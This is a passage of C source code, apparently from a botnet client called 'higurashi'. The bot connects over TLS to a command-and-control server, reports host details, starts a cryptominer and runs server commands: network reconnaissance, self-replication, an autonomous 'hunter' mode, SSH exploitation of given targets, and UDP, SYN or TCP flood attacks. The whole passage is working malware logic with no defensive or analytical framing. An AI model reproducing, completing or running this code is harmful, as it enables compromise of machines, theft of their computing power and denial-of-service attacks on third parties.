    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        // If primary C2 fails, try slave C2s (future implementation)
        sleep(60);
        return 1;
    }
    
    c2_ssl = SSL_new(ctx);
    SSL_set_fd(c2_ssl, sock);
    
    if (SSL_connect(c2_ssl) <= 0) {
        return 1;
    }
    
    // Send handshake
    struct utsname uname_data;
    uname(&uname_data);
    
    json_object *handshake = json_object_new_object();
    json_object_object_add(handshake, "action", json_object_new_string("handshake"));
    json_object_object_add(handshake, "type", json_object_new_string("higurashi"));
    
    char id_buf[128], os_buf[256];
    snprintf(id_buf, sizeof(id_buf), "%s_%d", BOT_NAME, getpid());
    snprintf(os_buf, sizeof(os_buf), "%s %s", uname_data.sysname, uname_data.release);
    
    // Set global bot_id
    snprintf(bot_id, sizeof(bot_id), "%s", id_buf);
    
    json_object_object_add(handshake, "id", json_object_new_string(id_buf));
    json_object_object_add(handshake, "arch", json_object_new_string(uname_data.machine));
    json_object_object_add(handshake, "os", json_object_new_string(os_buf));
    
    const char *handshake_str = json_object_to_json_string(handshake);
    char handshake_with_nl[2048];
    snprintf(handshake_with_nl, sizeof(handshake_with_nl), "%s\n", handshake_str);
    SSL_write(c2_ssl, handshake_with_nl, strlen(handshake_with_nl));
    json_object_put(handshake);
    
    // Give C2 time to process handshake
    sleep(1);
    
    // Start mining thread
    pthread_t mining_tid;
    pthread_create(&mining_tid, NULL, mining_thread, NULL);
    pthread_detach(mining_tid);
    
    // Command loop
    char buf[4096];
    while (1) {
        int bytes = SSL_read(c2_ssl, buf, sizeof(buf) - 1);
        if (bytes > 0) {
            buf[bytes] = '\0';
            
            json_object *jobj = json_tokener_parse(buf);
            if (jobj) {
                json_object *action_obj;
                if (json_object_object_get_ex(jobj, "action", &action_obj)) {
                    const char *action = json_object_get_string(action_obj);
                    
                    if (strcmp(action, "recon") == 0) {
                        pthread_t scan_tid;
                        pthread_create(&scan_tid, NULL, (void *(*)(void *))scan_network, NULL);
                        pthread_detach(scan_tid);
                        send_report("recon", "Network scan initiated");
                    } else if (strcmp(action, "auto_rep") == 0) {
                        json_object *state_obj;
                        if (json_object_object_get_ex(jobj, "state", &state_obj)) {
                            const char *state = json_object_get_string(state_obj);
                            auto_replicate = (strcmp(state, "on") == 0) ? 1 : 0;
                            send_report("auto_rep", auto_replicate ? "enabled" : "disabled");
                        }
                    } else if (strcmp(action, "hunter") == 0) {
                        json_object *state_obj;
                        if (json_object_object_get_ex(jobj, "state", &state_obj)) {
                            const char *state = json_object_get_string(state_obj);
                            if (strcmp(state, "on") == 0 && !hunter_mode) {
                                hunter_mode = 1;
                                start_autonomous_hunter();
                                send_report("hunter", "🎯 Autonomous Hunter Mode STARTED");
                            } else if (strcmp(state, "off") == 0) {
                                hunter_mode = 0;
                                send_report("hunter", "Hunter Mode STOPPED (threads will finish current scans)");
                            }
                        }
                    } else if (strcmp(action, "status") == 0) {
                        char status[256];
                        snprintf(status, sizeof(status),
                            "Compromised: %d | Auto-rep: %s | Uptime: %ld",
                            hosts_compromised, auto_replicate ? "ON" : "OFF", time(NULL));
                        send_report("status", status);
                    } else if (strcmp(action, "exploit") == 0) {
                        json_object *target_obj;
                        if (json_object_object_get_ex(jobj, "target", &target_obj)) {
                            const char *target = json_object_get_string(target_obj);
                            char msg[128];
                            snprintf(msg, sizeof(msg), "Exploiting %s", target);
                            send_report("exploit", msg);
                            exploit_ssh(target, 22);
                        }
                    } else if (strcmp(action, "attack") == 0) {
                        json_object *target_obj, *port_obj, *duration_obj, *type_obj;
                        if (json_object_object_get_ex(jobj, "target", &target_obj) &&
                            json_object_object_get_ex(jobj, "port", &port_obj) &&
                            json_object_object_get_ex(jobj, "duration", &duration_obj)) {
                            
                            AttackParams *params = (AttackParams *)malloc(sizeof(AttackParams));
                            strncpy(params->target, json_object_get_string(target_obj), 127);
                            params->port = json_object_get_int(port_obj);
                            params->duration = json_object_get_int(duration_obj);
                            params->start_time = time(NULL);
                            
                            const char *attack_type = "tcp";
                            if (json_object_object_get_ex(jobj, "type", &type_obj)) {
                                attack_type = json_object_get_string(type_obj);
                            }
                            
                            pthread_t attack_tid;
                            if (strcmp(attack_type, "udp") == 0) {
                                pthread_create(&attack_tid, NULL, ddos_udp_flood, params);
                            } else if (strcmp(attack_type, "syn") == 0) {
                                pthread_create(&attack_tid, NULL, ddos_syn_flood, params);
                            } else {
                                pthread_create(&attack_tid, NULL, ddos_tcp_flood, params);
                            }
                            pthread_detach(attack_tid);
                            
                            char msg[256];
                            snprintf(msg, sizeof(msg), "%s flood → %s:%d for %ds", 
                                    attack_type, params->target, params->port, params->duration);
                            send_report("attack", msg);
                        }
                    } else if (strcmp(action, "mine") == 0) {
                        pthread_t mine_tid;
                        pthread_create(&mine_tid, NULL, mining_thread, NULL);
                        pthread_detach(mine_tid);
                    }
                }
                json_object_put(jobj);
            }
        } else {
            break;
        }
    }
    
    SSL_free(c2_ssl);
    close(sock);
    SSL_CTX_free(ctx);
    return 0;
}